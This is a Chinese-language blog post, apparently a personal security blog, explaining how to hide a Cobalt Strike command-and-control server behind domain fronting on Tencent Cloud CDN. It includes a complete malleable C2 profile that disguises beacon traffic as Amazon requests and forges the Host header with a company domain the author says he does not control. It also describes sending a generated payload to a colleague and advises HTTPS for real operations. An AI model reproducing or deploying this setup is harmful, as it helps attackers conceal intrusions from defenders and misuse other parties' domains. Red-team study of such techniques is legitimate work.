---
layout: post
title:  "cobaltstrike 域前置隐藏 c2"
date:   2021-04-29 17:18:43
categories: Development
author: co0ontty
categories: 安全研究 ALL
tags: 安全研究 ALL
describe: cobaltstrike 域前置隐藏 c2
cover: '/assets/img/posts/WechatIMG3712.jpeg'
---
# cobaltstrike 域前置隐藏 c2

## 前言：

因为想搭建一套域前置来学习一下高端技术，但是看到网上各种博客和教程讲的我头晕脑涨，所以想写一下博客来记录一下。本文中的域名、c2 、cdn ip 都不会打厚码。能帮助刚接触的朋友快速理解。

## 原理介绍：

域前置的核心是 cdn 。在某 cdn 服务商开通 cdn 加速服务，并将想要伪造的域名与 c2 的 ip 进行绑定（阿里云和 cloudflare 需要验证，腾讯云不需要验证域名所属），通过向 cdn 的节点 ip 发送包含想要伪造 host 的请求，cdn 便会从记录中查找该 host 对应的源站 ip，并将流量转发至原站 ip。

## 开始搭建：

1. 腾讯云 cdn 开通全站加速，并填写相关信息（youhao 为我同事，eversec.cn 为我司域名但我无法控制，可以改为任意域名，47.*.*.34 为我的 c2 服务器，其 80 端口为 cobaltstrike 的 http listener）

![/assets/img/posts/WechatIMG41412.jpeg](/assets/img/posts/WechatIMG41412.jpeg)

2. 为 cobaltstrike teamserver 添加 profile，其中 `youhao.eversec.cn` 修改为想要伪装的域名   

``` bash
set sleeptime "5000";
set jitter    "0";
set maxdns    "255";
set useragent "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";

http-get {

    set uri "/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books";

    client {

        header "Accept" "*/*";
        header "Host" "youhao.eversec.cn";

        metadata {
            base64;
            prepend "session-token=";
            prepend "skin=noskin;";
            append "csm-hit=s-24KU11BB82RZSYGJ3BDK|1419899012996";
            header "Cookie";
        }
    }

    server {

        header "Server" "Server";
        header "x-amz-id-1" "THKUYEZKCKPGY5T42PZT";
        header "x-amz-id-2" "a21yZ2xrNDNtdGRsa212bGV3YW85amZuZW9ydG5rZmRuZ2tmZGl4aHRvNDVpbgo=";
        header "X-Frame-Options" "SAMEORIGIN";
        header "Content-Encoding" "gzip";

        output {
            print;
        }
    }
}

http-post {

    set uri "/N4215/adj/amzn.us.sr.aps";

    client {

        header "Accept" "*/*";
        header "Content-Type" "text/xml";
        header "X-Requested-With" "XMLHttpRequest";
        header "Host" "youhao.eversec.cn";

        parameter "sz" "160x600";
        parameter "oe" "oe=ISO-8859-1;";

        id {
            parameter "sn";
        }

        parameter "s" "3717";
        parameter "dc_ref" "http%3A%2F%2Fwww.amazon.com";

        output {
            base64;
            print;
        }
    }

    server {

        header "Server" "Server";
        header "x-amz-id-1" "THK9YEZJCKPGY5T42OZT";
        header "x-amz-id-2" "a21JZ1xrNDNtdGRsa219bGV3YW85amZuZW9zdG5rZmRuZ2tmZGl4aHRvNDVpbgo=";
        header "X-Frame-Options" "SAMEORIGIN";
        header "x-ua-compatible" "IE=edge";

        output {
            print;
        }
    }
}
```

3. 获取 cdn 的节点 ip，ping 这个 cname 获取到 cdn 的节点 ip

![/assets/img/posts/WechatIMG4144.jpeg](/assets/img/posts/WechatIMG4144.jpeg)
![/assets/img/posts/WechatIMG4143.png](/assets/img/posts/WechatIMG4143.png)

4. 添加 listener，生成 payload 发给 youhao，youhao 上线

![/assets/img/posts/WechatIMG4142.jpeg](/assets/img/posts/WechatIMG4142.jpeg)

5. 流量分析，为了方便理解所以使用的 http 进行的演示，可以看到已经看不到任何与 c2 通讯的特征，实战建议使用 https

![/assets/img/posts/WechatIMG3712.jpeg](/assets/img/posts/WechatIMG3712.jpeg)
